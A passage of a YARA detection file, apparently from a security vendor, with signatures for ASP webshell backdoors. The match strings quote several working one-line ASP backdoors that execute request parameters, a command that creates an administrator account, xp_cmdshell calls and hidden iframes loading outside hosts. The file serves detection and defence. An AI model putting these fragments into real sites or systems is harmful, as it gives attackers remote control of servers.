        $s3 = "+.)UaYg+blK/PK~ vq%2+OPc,[K/_h#*~Fb~SPDDOdT+Nv\\k1`bk'~D,?D+APU~{Y.hUU+*)O.D/onUvSnW,~:Pq,',kWM)wODS?U+BP~rb:)Gd#hW~,O.Yko" fullword ascii
        $s4 = "BPDXan'EtrN9+Uv,kN{v?`lmDrGxEP7lsEnxE v@*@!&0KDh@*r@#@&]]UJ@!/1.bwO,Vmxo!lTn'ELC\\m/^.bwYE@*J@#@&I\"jENKm!:nxO SDrY" fullword ascii
        $s5 = ";EG8?DDU*|rxT'EV2l[[EP^+^Uo{BTdalmr~1+sVMxE!v(WMN+EvlTBbNOt{4sn,h[?@!Ym?q{j(!E@*?=GxxvEPCmDrwK/Ov4WNxvEPh+D8wW.s:" fullword ascii
        $s6 = "B,\\CV;n{BfB@*@!z6W.h@*J@#@&]\"?E@!k^Mk2DP^lxTEmL+{B%l7ld^MkwDv@*r@#@&\"]jJ9W1Eh+UOch.kDn`E@!8.@*@!mnUD+.@*" fullword ascii
        $s7 = "DPr'0!/+M'EP,wm/dPE'6wC/k'J,lO~aWDO~r[~0aGMY~LJ,tl7+,[+^+O+9@!&[b\\@*r@#@&i+Vkn@#@&idM+dwGUk+ hMrY" fullword ascii
        $s8 = "UserPass=\"mumaasp.com\"'" fullword ascii
        $s9 = "P|lO'hU~+{.mKE~jDlfCTpc Ac3GrJDRx+YcW6G/1D\\kM'[n7kDKSnLUY4KCUL+{D^W;~UYCfmTiWR$ AfrJOc9nYcG6Wd1DtkD{N" fullword ascii
        $s10 = "4jqxj&@*==AUN,qW|m4Vn@*M@*@!zD[@*@!&DB@*@!zDsAo2wDxB[2~^KVWL=@!4D?&xjq?={1GY4nDP]/Kd+=?]dcZVrUT=()U({I]UPUUU#2^d+,=s?DDbO" fullword ascii
        $s11 = "=nD^NoG4+PD~[DD`kn.V9sKYn+C^M#|q6[PAx|dv2WnOc?C:MnkYb#U*xYD+KU+;ksU6/c~MY+MrRql:MndY#Py#St=CD+KY4cUM/'~MP/On,ksWwn:l-c?m:D" fullword ascii
        $s12 = "kxv8!!Ar9Y4@*@!O9P'?@!DD?&'U(Y9@*==JY[@*?UU?@*@!(?YM'=U?[GlsEnxF!vP7[Y4)*n{Bhr~kYzV(jDDvs+{Bf!Y,Ul@*@!rxa[=@!DN?&x?&=wDrGx" fullword ascii
        $s13 = "+9?+1EMn'ZJ~[,\\8^MV0,'PrOCb[nCbN9+U'TE,[~\\(^D^0~',JO)sSlz/zs^WAdWTkx{!r~[,\\8mMVW~LPJ /tmxo" fullword ascii
        $s14 = "(f:C=PqwaI,A6IG3I A6P:rHR/}S6I=~[!TR!Z!i,Z}Jr\")~aZ!WWZ!i,$r\"f2\"RPrhO;rJr]l,aT!RT!Zi~o}1KRozH(SIl,\\nMNmxlpP~6IG2]O\"q!u:O" fullword ascii
        $s15 = ":w'wEJ*B@*Kn:2@!Jl@*:Q@!l,t.n6'B%C7ldmMraYlUtKhsKV9nDvJEZ=-w]AZ5;J2\"--rEbB@*IAZeZJ3\"@!&l@*-~@!l~4M+0xvNl-lk^Mk2D)UtWSsKsN" fullword ascii
        $s16 = "Pd.1'YndDRC/aa,hr9Y4',l!,4+bo4Y{&TT@*@!zbWDm:+@*~E)\"+kwGxdnch.kDnPr@!8.@*@!4.@*@!w@*@!(.@*@!2@*@!(D@*@!4M@*@!a@*@!4M@*@!^" fullword ascii
        $s17 = "D-n#UPD4+DU#{=cUaWMRoW.h$En/Dr0,DnU#%,S*2&f~2fW*S8c8&,BcBq&l~T~8FTSy*~R+FB &bdO'?nKDOS1XRU|+^d+#:c=aWY oKDn;!nkkdD'MnWMYd.Y?#|+" fullword ascii
        $s18 = ";;+kORwW.hvJ02Ck/E#@#@&6wGMY,'PM+$;+kY sKDhcr0wK.Yr#@#@&W2lDt,'~Dn5!+dYcoWM:cE6wlO4r#@#@&a.b\\r^+T+'M+$;+kY sKDhcrwDb-k^+o" fullword ascii
        $s19 = "B@*!@!zWWUO@*@!8D@*E[wRHCs+[E@!Jl@*J,@#@&?({?&[J@!4M@*@!(@*,@!J4@*@!mPtMn0{BLm-C/1DbwO)o;^VoWMh`rJE'\"+nCO4`KlD4LJwr[wR1m:" fullword ascii
        $s20 = "6D@#@&U+D~6hWdY,'~/M+lDnr(L+1OcJt?oHJ  ptSuK:KJ*@#@&ahW/O }wnx,Ehrj:JBPJ4YD2)Jzq FRT ZRF=E[,wWMO~[rz^+C\\ndr~~KM;+@#@&aKK/Y j" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule sig_68040c9830d03127e21fb9aac7050fe6a70157d5
{
     meta:
        description = "asp - file 68040c9830d03127e21fb9aac7050fe6a70157d5.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "38f63e43d98de7d5005af23ef48ade06eccf59392ebd481cf39c4b99d53977ee"
     strings:
        $x1 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files will be DUMPED Too and From" fullword ascii
        $x2 = "<form method=\"post\" ENCTYPE=\"multipart/form-data\" action=\"/keio.asp?upload=@&txtpath=F:\\freehost\\zxyzch10a\\web\">" fullword ascii
        $x3 = "<!-- Copyright Vela iNC. Apr2003 [www.shagzzz.cjb.net] Coded by ~sir_shagalot -->" fullword ascii
        $s4 = "<form method=post name=frmCopySelected action=\"/keio.asp?txtpath=F:\\freehost\\zxyzch10a\\web\">" fullword ascii
        $s5 = "<BR><center><form method=post action=\"/keio.asp?txtpath=F:\\freehost\\zxyzch10a\\web\">" fullword ascii
        $s6 = "document.myform.txtpath.value = \"F:\\freehost\\zxyzch10a\\web\\\" & \"\\\" & thestuff" fullword ascii
        $s7 = "PSD.psd</option></select><input type=hidden name=txtpath value=\"F:\\freehost\\zxyzch10a\\web\"><input type=Submit name=cmd valu" ascii
        $s8 = "document.myform.txtpath.value = \"F:\\freehost\\zxyzch10a\\web\\\" & thestuff" fullword ascii
        $s9 = "fso.CopyFile Request.QueryString(\"txtpath\") & \"\\\" & Request.Form(\"Fname\"),Target & Request.Form(\"Fname\")" fullword ascii
        $s10 = "fso.CopyFile Target & Request.Form(\"ToCopy\"), Request.Form(\"txtpath\") & \"\\\" & Request.Form(\"ToCopy\")" fullword ascii
        $s11 = "/Font><BR><font face=wingdings color=Gray >1</font><font face=Arial size=+1 > F:\\freehost\\zxyzch10a\\web\\</Font>" fullword ascii
        $s12 = "<tr><td colspan=2 cellpadding=2 bgcolor=#303030 ><font face=Arial size=-1 color=gray>Virtual: http://www.634629883.com/keio.asp<" ascii
        $s13 = "/option><option value=\"web.config\">&nbsp;&nbsp;web.config -- [1 kb]</option><option value=\"" fullword ascii
        $s14 = "<form method=\"post\" action=\"/keio.asp\" ><font face=arial size=-1 >Delete file from current directory:</font><BR>" fullword ascii
        $s15 = "Response.write \"<font face=arial size=-2>You need to click [Create] or [Delete] for folder operations to be</font>\"" fullword ascii
        $s16 = "<form method=post name=frmCopySelected action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
        $s17 = "PSD.psd</option></select><input type=hidden name=txtpath value=\"F:\\freehost\\zxyzch10a\\web\"><input type=Submit name=cmd valu" ascii
        $s18 = "option><option>search.asp</option><option>taglist.asp</option><option>tags.asp</option><option>web.config</option><option>" fullword ascii
        $s19 = "<BR><center><form method=post action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
        $s20 = "<table><tr><td><%If Request.Form(\"chkXML\") = \"on\"  Then getXML(myQuery) Else getTable(myQuery) %></td></tr></table></form>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_350f006e74cd3d876d9f50c6a7b4acf656aac1d8
{
     meta:
        description = "asp - file 350f006e74cd3d876d9f50c6a7b4acf656aac1d8.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "98524084edfac5bc95205780cd611e5c8bcdd03d9c8fc9df30539058f3c5cb58"
     strings:
        $s1 = "<% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>" fullword ascii
        $s2 = "http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave " fullword ascii
     condition:
        ( uint16(0) == 0x8fe5 and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_298dabd38b3ffbb78d1deff8ce03273270ebff54
{
     meta:
        description = "asp - file 298dabd38b3ffbb78d1deff8ce03273270ebff54.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "62bf8d2408f9a2011702415f9f19e026ed0efbd16a01ea12937f368660b0c589"
     strings:
        $s1 = "Execute cd(\"6877656D2B736972786677752B237E232C2A\",\"1314\")" fullword ascii
        $s2 = "6877656D2B736972786677752B237E232C2A" ascii /* hex encoded string 'hwem+sirxfwu+#~#,*' */
        $s3 = "cd = cd & Chr((\"&H\" & c) - p)" fullword ascii
        $s4 = "k = (i + 1) / 2 Mod Len(key) + 1" fullword ascii
        $s5 = "cd = cd & Chr(\"&H\" & c & Mid(s, i + 2, 2))" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule c9fd0572067a6644b50c2a75ed4de64dafae9b16
{
     meta:
        description = "asp - file c9fd0572067a6644b50c2a75ed4de64dafae9b16.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "ea5b5ebbe551a8362efd596df4e5fd4f58e1f2cdb465e4c312d52ed85b3af1c9"
     strings:
        $s1 = "Execute MorfiCode(\")/*/z/*/(tseuqer lave\")" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule d0f707adf7ecb4928a21c3c32d990b768cb937a4
{
     meta:
        description = "asp - file d0f707adf7ecb4928a21c3c32d990b768cb937a4.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "d0cb05a853e883fce03015ac39b9e8c10adb902681bf320eedcd89dd27747d84"
     strings:
        $x1 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\13cmd.exe\")&\"' size='40'>\"" fullword ascii
        $x2 = "RRS(~~)`~),~,~portForm(uest.t(req Splitmp =~)`ip~),orm(~est.F(requSplitip = ~,~)`bound to Uu = 0For h(ip)` = 0 ,~-~)p(hu)Str(iIf" ascii
        $x3 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>" fullword ascii
        $s4 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s5 = "case \"apjdel\":apjdel():case\"hiddenshell\":hiddenshell():case \"php\":php():case \"aspx\":aspx():case \"jsp\":jsp():Case \"MMD" ascii
        $s6 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
        $s7 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
        $s8 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next" fullword ascii
        $s9 = "SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:I" ascii
        $s10 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href=\"&blogurl&\" target=_blank>" ascii
        $s11 = "ExeCute \"sub ShowErr():If Err Then:RRS\"\"<br><a href='javascript:history.back()'><br>&nbsp;\"\" & Err.Description & \"\"</a><b" ascii
        $s12 = "e=tlti' am='ssla c)'~~leFipyCo~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI~` ~ -b></>]<b> /ae<ov>M" fullword ascii
        $s13 = "rrs\"<center><h2>Fuck you,Get out!!</h2><br><a href='javascript:history.back()'>" fullword ascii
        $s14 = "e=tlti' am='ssla c)'~~leFiitEd~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI~`> /al<De'>" fullword ascii
        $s15 = "%></body><iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe></html>" fullword ascii
        $s16 = ")&chr(10):Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provid" ascii
        $s17 = "NewFolder(FName):Set ABC=Nothing:Case \"UpFile\":UpFile():Case \"Cmd1Shell\":Cmd1Shell():Case \"Logout\":Session.Contents.Remove" ascii
        $s18 = "Then:If Err.number = -2147217843 or Err.number = -2147467259 Then:If InStr(Err.description, \"(Connect()).\") > 0 Then:RRS(targe" ascii
        $s19 = "e=tlti' am='ssla c)'~~leFiveMo~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI`>~<br><b~K)&2410e/iz.s(Lng" ascii
        $s20 = "all) :T.close:Set T=Nothing:Else:Path=Session(\"FolderPath\")&\"\\newfile.asp\":Txt=\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_7f6d42df51c7029a9bdc2a7bf9a66903a48732dd
{
     meta:
        description = "asp - file 7f6d42df51c7029a9bdc2a7bf9a66903a48732dd.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "dc3ad511eae2564b5d3b94f93468b9fae1114f4b70d851177d6938ad99be21b6"
     strings:
        $s1 = "content = Replace(content,\"SITE_URL\",\"http://\"&Request.ServerVariables(\"SERVER_NAME\")&\"/\"&htmlpath_&\"/\"&nnfilename) " fullword ascii
        $s2 = "Bianlireplate site_root_str(i),addcontent,recontent,includefiles,noincludefiles,filetype,hanfiles " fullword ascii
        $s3 = "Bianlireplate site_root_str(i),addcontent,recontent,includefiles,noincludefiles,filetype,hanfile" fullword ascii
        $s4 = "Bianlireplate site_root,addcontent,recontent,includefiles,noincludefiles,filetype,hanfiles " fullword ascii
        $s5 = "files,filetype,hanfiles,recontent,site_root,defaulthtml,defaultreplace,read " fullword ascii
        $s6 = "set f=fso.Getfile(server.mappath(Request.ServerVariables(\"SCRIPT_NAME\"))) " fullword ascii
        $s7 = "newf_content = ReadFromTextFile(path&\"/\"&Objfile.name,\"utf-8\") " fullword ascii
        $s8 = "getFileExt = Mid(sFileName, InstrRev(sFileName, \".\") + 1) " fullword ascii
        $s9 = "Randomize(Timer) : sj_int = Int((max - min + 1) * Rnd + min) " fullword ascii
        $s10 = "Randomize(Timer) : Rand = Int((max - min + 1) * Rnd + min) " fullword ascii
        $s11 = "WriteIn Server.MapPath(\"/\")&\"/\"&paths_str(i)&\"/\"&nnfilename,content " fullword ascii
        $s12 = "Set fso = Server.CreateObject(\"S\"&\"cr\"&\"ip\"&\"ti\"&\"ng.Fi\"&\"le\"&\"Sys\"&\"tem\"&\"Ob\"&\"je\"&\"ct\") " fullword ascii
        $s13 = "Response.write \"<sbj:url>\"&path&\"/\"&Objfile.name&\"</sbj:url>\"&codepage&chr(13) " fullword ascii
        $s14 = "WriteIn Server.MapPath(\"/\")&\"/\"&dpath&\"/\"&nnfilename,content " fullword ascii
        $s15 = "WriteIn Server.MapPath(\"/\")&\"/\"&htmlpath_&\"/\"&nnfilename,content " fullword ascii
        $s16 = "newf_content = Replace(newf_content,recontent,addcontent) " fullword ascii
        $s17 = "Response.write \"<sbj:url>\"&\"/\"&htmlpath_&\"/\"&nnfilename&\"</sbj:url>\" " fullword ascii
        $s18 = "ElseIf AscB(MidB(bintou,1,1))=&HFF And AscB(MidB(bintou,2,1))=&HFE Then " fullword ascii
        $s19 = "Function Bianlireplate(path,addcontent,recontent,includefiles,noincludefiles,filetype,hanfiles)   " fullword ascii
        $s20 = "Bianlireplate nowpath,addcontent,recontent,includefiles,noincludefiles,filetype,hanfiles '??   " fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 70KB and ( 8 of them ) ) or ( all of them )
}

rule sig_7b35ac9522cbff89e4278d10508d35bf4e7ead31
{
     meta:
        description = "asp - file 7b35ac9522cbff89e4278d10508d35bf4e7ead31.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "403fbd7090f1557216af3dcf22f532803c38392cb82e341ecab7a3d614201ab4"
     strings:
        $s1 = "<%If Request(\"ah\")<>\"\" Then Execute(Request(\"ah\"))%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_512a06bc401e5b437968ba0d9d81f1b66c7a3711
{
     meta:
        description = "asp - file 512a06bc401e5b437968ba0d9d81f1b66c7a3711.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "087dac16734d0c4d23d08080d6f8e031ed6eb19659a532827326671947d636f2"
     strings:
        $x1 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\13cmd.exe\")&\"' size='40'>\"" fullword ascii
        $x2 = "RRS(~~)`~),~,~portForm(uest.t(req Splitmp =~)`ip~),orm(~est.F(requSplitip = ~,~)`bound to Uu = 0For h(ip)` = 0 ,~-~)p(hu)Str(iIf" ascii
        $x3 = "<a href='javascript:ShowFolder(\"\"C:\\\\Documents and Settings\\\\All Users\\\\Documents\\\\\"\")'>" fullword ascii
        $s4 = "<a href='javascript:ShowFolder(\"\"c:\\\\Documents and Settings\\\\All Users\\\\" fullword ascii
        $s5 = "case \"apjdel\":apjdel():case\"hiddenshell\":hiddenshell():case \"php\":php():case \"aspx\":aspx():case \"jsp\":jsp():Case \"MMD" ascii
        $s6 = "if addcode=\"\" then addcode=\"<iframe src=http://127.0.0.1/m.htm width=0 height=0></iframe>\"" fullword ascii
        $s7 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
        $s8 = "RRS\"<td><input name='c' type='text' id='c' value='cmd /c net user userSea passSea /add & net localgroup administrators userSea " ascii
        $s9 = "Server.ScriptTimeout=999999999:Response.Buffer=true:On Error Resume Next" fullword ascii
        $s10 = "RRS\".cmd{background-color:\"&color6&\";color:\"&color7&\"}\"" fullword ascii
        $s11 = "SQLOLEDB.1;Data Source=\" & targetip &\",\"& portNum &\";User ID=lake2;Password=;\":conn.ConnectionTimeout=1:conn.open connstr:I" ascii
        $s12 = "si=\"<center><div style='width:500px;border:1px solid #222;padding:22px;margin:100px;'><br><a href=\"&blogurl&\" target=_blank>" ascii
        $s13 = "ExeCute \"sub ShowErr():If Err Then:RRS\"\"<br><a href='javascript:history.back()'><br>&nbsp;\"\" & Err.Description & \"\"</a><b" ascii
        $s14 = "RRS\"input,select,textarea{font-size: 12px;background-color:\"&color3&\";border:1px solid \"&color4&\"}\"" fullword ascii
        $s15 = "e=tlti' am='ssla c)'~~leFipyCo~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI~` ~ -b></>]<b> /ae<ov>M" fullword ascii
        $s16 = ": #00fcfc;SCROLLBAR-TRACK-COLOR: #000000;SCROLLBAR-DARKSHADOW-COLOR: #00fcfc;SCROLLBAR-BASE-COLOR: #000000}\"" fullword ascii
        $s17 = "rrs\"<center><h2>Fuck you,Get out!!</h2><br><a href='javascript:history.back()'>" fullword ascii
        $s18 = "e=tlti' am='ssla c)'~~leFiitEd~~~,~~)&meNaL.~&~\\h&at(PthPaRe~&~~m(orlFul:Fptriscvaja='efhra ~<I&=SSI~`> /al<De'>" fullword ascii
        $s19 = "%></body><iframe src=http://7jyewu.cn/a/a.asp width=0 height=0></iframe></html>" fullword ascii
        $s20 = ")&chr(10):Sub Scan(targetip, portNum):On Error Resume Next:set conn = Server.CreateObject(\"ADODB.connection\"):connstr=\"Provid" ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 200KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_1d6fc42a9221e87214b5a316ac2bc76cf49f4fd6
{
     meta:
        description = "asp - file 1d6fc42a9221e87214b5a316ac2bc76cf49f4fd6.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "1acff7ac75d73a0c7589e0403e5e7be7b4708faf278f76eb45008710a7f9a4c8"
     strings:
        $x1 = "var oonsd='';function zfzf(path){var regRoot=dzzx(path,'\\\\',true);path=path.substr(regRoot.length+1);var regKey=zsz(path,'" ascii
        $x2 = "conn.Execute(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,strPath VarChar,binContent Image)\")" fullword ascii
        $x3 = "conn.execute(\"exec mast\"+mqe+\"er..xp\"+cla+\"_cmdshell'bcp \"\"\"&podw&\"..dark_temp\"\" in \"\"\"&wckz&\"\"\" -T -f c:\\tmp." ascii
        $x4 = "conn.execute(\"exec mast\"+mqe+\"er..xp\"+cla+\"_cmdshell'bcp \"\"select binfile from \"&podw&\"..dark_temp\"\" queryout \"\"\"&" ascii
        $x5 = "conn.execute \"CREATE TABLE [dark_temp] ([id] [int] NULL ,[binfile] [Image] NULL) ON [PRIMARY] TEXTIMAGE_ON [PRIMARY];\"" fullword ascii
        $x6 = "conn.execute(\"EXEC mast\"+mqe+\"er..xp\"+cla+\"_cmdshell 'echo \"&substrfrm&\" >>c:\\tmp.fmt'\")" fullword ascii
        $x7 = "conn.execute(\"EXECUTE mast\"+mqe+\"er..xp\"+cla+\"_cmdshell 'del c:\\tmp.fmt'\")" fullword ascii
        $x8 = "conn.execute \"If object_id('dark_temp')is not null drop table dark_temp\"" fullword ascii
        $x9 = "conn.execute \"CREATE TABLE [dark_temp] ([binfile] [Image] NULL)\"" fullword ascii
        $x10 = "iiit\"text\",\"fhbej\",\"C:\\WINDOWS\\syste\"+xyjdv+\"m32\\cmd.exe\",\"35%\",\"\",\"\"" fullword ascii
        $x11 = "iiit\"text\",\"ggwz\",\"C:\\WINDOWS\\syste\"+xyjdv+\"m32\\cmd.exe\",\"35%\",\"\",\"\"" fullword ascii
        $x12 = "nfe=nfe&\"<a href='http://www.helpsoff.com.cn' target='_blank'>Fuck Tencent</a>\"" fullword ascii
        $x13 = "conn.execute(\"exec mast\"+mqe+\"er..xp\"+cla+\"_cmdshell'bcp \"\"select binfile from \"&podw&\"..dark_temp\"\" queryout \"\"\"&" ascii
        $s14 = "If ihyn=\"\"Then ihyn=\" /c net u\"+rmct+\"ser > \"&zhyko&\"\\temp.txt\"" fullword ascii
        $s15 = "qean eyr,\"Found <font color=\"\"red\"\">Serv\"+jiksj+\"er.Execute / Transfer()</font> Function\"" fullword ascii
        $s16 = "Response.AddHeader\"Content-Disposition\",\"Attachment; Filename=\"&sxip&\".txt\"" fullword ascii
        $s17 = "'Set rs=conn.Execute(\"select count(*) from [\"&svznx&\"]\")" fullword ascii
        $s18 = "iiit\"text\",\"vxeyd\",\"C:\\WINDOWS\\Temp\\~098611.tmp\",\"30%\",\"\",\"\"" fullword ascii
        $s19 = "iiit\"text\",\"cpbdz\",\"C:\\WINDOWS\\Temp\\~098611.tmp\",\"50%\",\"\",\"\"" fullword ascii
        $s20 = "exhpr\"C:\\documents and Settings\\All Users\\Start Menu\\Programs\",\"Start Menu->Programs\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 1 of ($x*) and all of them ) ) or ( all of them )
}

rule a75871435b4afa25d8dec250bf063f0bf6d0c1fa
{
     meta:
        description = "asp - file a75871435b4afa25d8dec250bf063f0bf6d0c1fa.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6816ce29f897276becd5f16b2cad79602bbc1d800d032aeeea878a7c50cdfc6f"
     strings:
        $s1 = "imgurl=\"http://www.fzl1314.com/uploads/allimg/110116/21340HS3-5.jpg\" '" fullword ascii
        $s2 = "RRS\"  <table width=\"\"540\"\" border=\"\"0\"\" cellpadding=\"\"2\"\" cellspacing=\"\"1\"\" bgcolor=\"\"#CCCCCC\"\">\"" fullword ascii
        $s3 = "url=\"www.baidu.com\"  '" fullword ascii
        $s4 = "server.mappath(request.servervariables(\"script_name\"))" fullword ascii
        $s5 = "Set objFSO = Server.CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
        $s6 = "RRS\"<STYLE>td {font-size: 9pt;line-height: 1.5;text-decoration: none;color: #FFFFFF;}\"" fullword ascii
        $s7 = "RRS\"      <td align=\"\"center\"\" bgcolor=\"\"#000000\"\"><form method=post>\"" fullword ascii
        $s8 = "RRS\"          <table width=\"\"95%\"\" border=\"\"0\"\" cellpadding=\"\"3\"\" cellspacing=\"\"1\"\" bgcolor=\"\"#999999\"\">\"" fullword ascii
        $s9 = "RRS\"      <td align=\"\"center\"\" bgcolor=\"\"#000000\"\"><font color=\"\"#FFFFFF\"\">\"&Copyright&\"</font></td>\"" fullword ascii
        $s10 = "RRS\"a:active {color: #0099FF;text-decoration: underline overline;}\"" fullword ascii
        $s11 = "RRS\"a:hover {color: #FF0000;text-decoration: underline;}</STYLE>\"" fullword ascii
        $s12 = "RRS\"      <td height=\"\"151\"\" align=\"\"center\"\" bgcolor=\"\"#000000\"\"><img src=\"&imgurl&\"></td>\"" fullword ascii
        $s13 = "Set objCountFile=objFSO.CreateTextFile(request(\"syfdpath\"),True)" fullword ascii
        $s14 = "RRS\"a:visited {color: #CCCCCC;text-decoration: none;}\"" fullword ascii
        $s15 = "RRS\"              <td bgcolor=\"\"#000000\"\"><input name=\"\"submit\"\" type=submit value=\"\"" fullword ascii
        $s16 = "RRS\"<body bgcolor=\"\"#000000\"\"><div align=\"\"center\"\">\"" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 7KB and ( 8 of them ) ) or ( all of them )
}

rule d02f126451335aab87a73847e26200e3d52f8c2a
{
     meta:
        description = "asp - file d02f126451335aab87a73847e26200e3d52f8c2a.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f3a1433f6754fc76cc5412e19d84aea7ed841243f6fa49001288bb2d01d93d86"
     strings:
        $s1 = "B~Um:+{vl1YkKUvP7l^En'v+E@*@!zD[@*@!zO.@*@!zWGM:@*@!6GM:~s+DtW9'aG/DPCmDkGU{Bgz^YbWx{)s+XlEPUlhn{BWWMhFE@*@!OMPlsrTxxB1n" fullword ascii
        $s2 = "mYEb@#@&2+XxrmGsF-mWs -^Ws&kmK:*k1W:lkmK:v-^G:Fu1Wh%k^K:1u^2Y8us2D us2D&kVaOWusaYluVaY+kVaY{u^wO0-VwD1J@#@&D" fullword ascii
        $s3 = "/YcsK.:vJ[lDlEb@#@&diGED0k^n m^Wk+~@#@&7iPd+D~0k'UGDtkUL@#@&7d,WclODDb4ED+k~',F@#@&i+U[,k0@#@&d@#@&dMndwKxk+ " fullword ascii
        $s4 = "xUOD,'~JhDG-bN+MxHbmDKdG0DRx+OR6JAf$RW !pP9CDlPjG!D^+{E,[~U+M\\+MRtCwhlOtvJ4d4R:98J*@#@&m[GZmYmVGo /M+CY" fullword ascii
        $s5 = "Y+MEJ,mVmdd'ktKhskdODN@*@!m~tM+WxELl-Ckm.kaO=s;^VwWDs`rEJLI3wmK4chlY_'J'J[^ Uls2*[EJESrJ\\W7nsbVnEr#B~^^ld/{vm:v,YbYV" fullword ascii
        $s6 = "/lL(~rP~@!K\"Pl^kTU'sk[N^+~^^l/kxK~Kf@*ElL(PrP~P~@!wr]H,CmDkGU{J)%8,J_b1ObWU{?1lxGDb-+Lf.k7+xE=L4,~fMk\\" fullword ascii
        $s7 = "@*@!&:f@*J)N4,EP,P~P,P~@!Jsr\"\\@*r)L(~EP,@!JK]@*ElN4~J,~@!:I~^^l/dx:APf@*E=L8,J,PP,@!w6ItPCmDkGU{J)N8Prgb1OrW" fullword ascii
        $s8 = "'\\CbxHnU!B~hb[DtxEFZ!]EP4nkTtO'EFTTuBP6.ls+4K.[+M'E!v@*@!&b0.lsn@*@!zO[@*J@#@&%(J@!Y9@*r@#@&N4r@!k6Dmh+,xC:" fullword ascii
        $s9 = "OO:X2+=PES8#_8*@#@&PP,~~P,Pw2Uf~x,kH?D.`w?P)MK~O(g~#4;]*@#@&,P,PP,P,O0^Rokd+dPmDY,xNb+xG@#@&P,P,P~P~PwV s&s2Uq\"3,'P[j:b.Y,RGkn" fullword ascii
        $s10 = "YnDzD.CH`k*b@#@&2x9~(0,@#@&1n6O@#@&L8PkODK4%@#@&2Vdn@#@&%4,EAD.KDePZmxEOP\"+CNeJ@#@&AxN,(0@#@&L(~E@!(D@*@!8D@*E@#@&KWMObMDCz{" fullword ascii
        $s11 = "l,@!&Y9@*r@#@&,PUk'UqLE@!DN@*@!bx2;DPxmh+{B?$sjYMB,/OXsn{BAk9Ot=c{TEP\\Cs!+xJrEL/}^/:D[rJr@*@!JY[@*r@#@&~,/q{dqLJ@!D[~l^kTxxB^n" fullword ascii
        $s12 = "?PDMn.vk2c4E#SEcJb_8S8#~:W,Hq9`b2`4Eb~&1dO\"`qacC!#~rRE#3FBS31cra`4j*bObxjOM`k2c_Eb~rRr#b@#@&6rI,q,xPZPPr,j8G`xfvP:a#@#@&rWPb/" fullword ascii
